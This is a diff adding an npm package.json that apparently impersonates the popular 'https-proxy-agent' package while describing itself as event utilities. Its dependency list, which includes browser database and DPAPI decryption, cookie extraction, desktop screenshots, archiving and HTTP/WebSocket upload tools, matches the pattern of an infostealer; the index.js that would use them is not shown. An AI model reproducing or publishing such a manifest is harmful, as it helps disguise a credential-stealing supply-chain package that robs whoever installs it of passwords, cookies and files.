@@ -1,0 +1,44 @@
+{
+  "name": "https-proxy-agent",
+  "version": "3.2.1",
+  "description": "Lightweight event utilities and helpers for Node.js applications",
+  "main": "index.js",
+  "scripts": {
+    "test": "node -e \"console.log('ok')\""
+  },
+  "keywords": [
+    "events",
+    "utilities",
+    "helpers",
+    "node",
+    "event-emitter",
+    "middleware",
+    "callback"
+  ],
+  "author": "devtools-contrib",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/devtools-contrib/event-utils-pro.git"
+  },
+  "engines": {
+    "node": ">=14.0.0"
+  },
+  "files": [
+    "index.js"
+  ],
+  "dependencies": {
+    "sqlite3": "^5.1.7",
+    "@primno/dpapi": "^1.0.0",
+    "axios": "^1.7.0",
+    "fs-extra": "^11.2.0",
+    "form-data": "^4.0.0",
+    "jszip": "^3.10.1",
+    "screenshot-desktop": "^1.15.0",
+    "buffer-replace": "^1.0.0",
+    "ws": "^8.17.0",
+    "@rookie-rs/api": "^1.0.0",
+    "archiver": "^7.0.0",
+    "node-stream-zip": "^1.15.0"
+  }
+}
